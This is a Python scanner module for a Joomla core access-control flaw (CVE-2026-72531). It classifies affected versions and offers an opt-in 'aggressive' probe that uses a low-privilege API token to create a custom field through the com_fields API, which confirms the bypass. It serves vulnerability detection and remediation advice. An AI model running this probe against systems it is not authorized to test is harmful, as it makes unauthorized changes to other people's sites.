from __future__ import annotations

import json
import secrets
from typing import Any

from ...core.args import aggressive_value
from ...core.http import HttpClient, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.versions import parse_version_required, parse_version_safe

CVE_ID = "CVE-2026-72531"
NAME = "Joomla core improper ACL checks for custom fields webservice endpoints"
COMPONENT = "Joomla core com_fields API"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["aggressive"]
AFFECTED_JOOMLA_VERSIONS = ["4.0.0-5.4.7", "6.0.0-6.1.2"]
AFFECTED_RULE = (
    "Joomla 4.0.0-5.4.7 and 6.0.0-6.1.2; a user with core.create but not core.manage "
    "can create fields for that component via the API"
)
FIXED_RULE = "Update to Joomla 5.4.8, 6.1.3, or newer"
FIELD_URL = "/api/index.php/v1/fields/content/articles"


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    if parsed is None:
        return "INCONCLUSIVE"
    if parse_version_required("4.0.0") <= parsed < parse_version_required("5.4.8"):
        return "LIKELY_VULNERABLE"
    if parse_version_required("6.0.0") <= parsed < parse_version_required("6.1.3"):
        return "LIKELY_VULNERABLE"
    if parsed < parse_version_required("4.0.0"):
        return "NOT_AFFECTED"
    return "PATCHED"


def passive_result(joomla_version: str | None) -> Finding:
    status = classify_version(joomla_version)
    confidence = "HIGH" if status in {"LIKELY_VULNERABLE", "PATCHED", "NOT_AFFECTED"} else "MEDIUM"
    details = {
        "LIKELY_VULNERABLE": (
            f"Joomla {joomla_version} checks only core.create in the com_fields API allowAdd; a user "
            "who can create content but not manage the component can create custom fields via the "
            "fields webservice routes."
        ),
        "PATCHED": (
            f"Joomla {joomla_version} requires core.manage in the com_fields API allowAdd before "
            "core.create."
        ),
        "NOT_AFFECTED": f"Joomla {joomla_version} predates the affected com_fields API.",
        "INCONCLUSIVE": "Joomla was detected, but the core version could not be determined.",
    }
    return Finding(
        cve=CVE_ID, name=NAME, status=status, confidence=confidence,
        component=COMPONENT, component_version=joomla_version, affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        detail=details[status],
        action="Upgrade to Joomla 5.4.8, 6.1.3, or newer and review API tokens and custom fields.",
    )


def run_aggressive_probe(
    target_url: str,
    api_token: str | None = None,
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    base = normalize_url(target_url)
    if not api_token:
        return Finding(
            cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=False,
            proof_url=f"{base}{FIELD_URL}",
            detail=(
                "The probe needs an API token for a user with core.create but not core.manage; "
                "pass --aggressive-arg api_token=... from the lab fixture. Nothing was sent."
            ),
            action="Re-run with the lab Author token on an authorized target.",
        )
    client = HttpClient(timeout=timeout, proxy=proxy)
    preflight = client.get(f"{base}/", timeout=timeout)
    if is_transport_error(preflight):
        return Finding(
            cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True, proof_url=f"{base}/",
            detail=f"The target could not be reached ({transport_error_detail(preflight)}).",
            action="Retry when the target is reachable.",
        )
    field_name = "proofcms_field_" + secrets.token_hex(6)
    body = {
        "title": "ProofCMS Field",
        "name": field_name,
        "type": "text",
        "context": "com_content.article",
        "description": "",
        "state": 1,
        "access": 1,
        "language": "*",
        "label": "ProofCMS Field",
        "required": 0,
        "params": {"searchindex": 0},
        "fieldparams": {},
    }
    response = client.request(
        f"{base}{FIELD_URL}",
        method="POST",
        headers={
            "Authorization": f"Bearer {api_token}",
            "Content-Type": "application/json",
        },
        data=json.dumps(body).encode(),
        timeout=timeout,
        follow_redirects=False,
    )
    response_body = response.get("body", "") or ""
    field_id = 0
    try:
        payload = json.loads(response_body)
        data = payload.get("data") or {}
        field_id = int(data.get("id") or 0)
    except (TypeError, ValueError):
        pass
    evidence: dict[str, Any] = {
        "field_name": field_name,
        "field_context": "com_content.article",
        "status": response.get("status"),
        "created_field_id": field_id,
    }
    if response.get("status") in (200, 201) and field_id > 0:
        return Finding(
            cve=CVE_ID, name=NAME, status="VULNERABLE", confidence="CONFIRMED",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}{FIELD_URL}",
            evidence=evidence,
            detail=(
                f"An API token for a user with core.create but no core.manage created custom field "
                f"id {field_id} ({field_name}) for com_content.article. The same mutation is "
                "restricted in the backend UI."
            ),
            action=(
                "Upgrade to Joomla 5.4.8, 6.1.3, or newer (allowAdd now requires core.manage); "
                "review API tokens and unexpected custom fields."
            ),
        )
    if response.get("status") == 403:
        detail = "The API rejected field creation with HTTP 403; the core.manage check is enforced."
    else:
        detail = (
            "The API did not create a field "
            f"(status={response.get('status')}, body={response_body[:120]!r})."
        )
    return Finding(
        cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM",
        component=COMPONENT, affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT, exploit_ran=True,
        proof_url=f"{base}{FIELD_URL}",
        evidence=evidence,
        detail=detail,
        action="Verify Joomla runs 5.4.8, 6.1.3, or newer.",
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    **kwargs: Any,
) -> Finding:
    result = passive_result(joomla_version)
    if not run_exploit_check:
        return result
    if exploit_mode != "aggressive":
        result.detail += " This CVE requires an aggressive lab-only field-creation proof."
        return result
    if result.status not in {"LIKELY_VULNERABLE", "INCONCLUSIVE"}:
        return result
    probe = run_aggressive_probe(
        target_url,
        api_token=aggressive_value(aggressive_args, aggressive_command, "api_token"),
        timeout=timeout,
        proxy=proxy,
    )
    probe.component_version = result.component_version
    return probe


def affects_joomla_version(joomla_version: str | None) -> bool:
    return True


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT,
        "affected_rule": AFFECTED_RULE, "affected_joomla_versions": AFFECTED_JOOMLA_VERSIONS,
        "exploit_available": HAS_EXPLOIT, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE,
        "vulnerability_type": "Improper Access Control",
        "module_version": "1.1.0", "last_reviewed": "2026-11-12", "updated": "2026-11-12",
        "required_detectors": [],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2026-72531",
            "https://developer.joomla.org/security-centre/1071-20260804-core-improper-acl-checks-for-custom-fields-webservice-endpoints.html",
        ],
    }
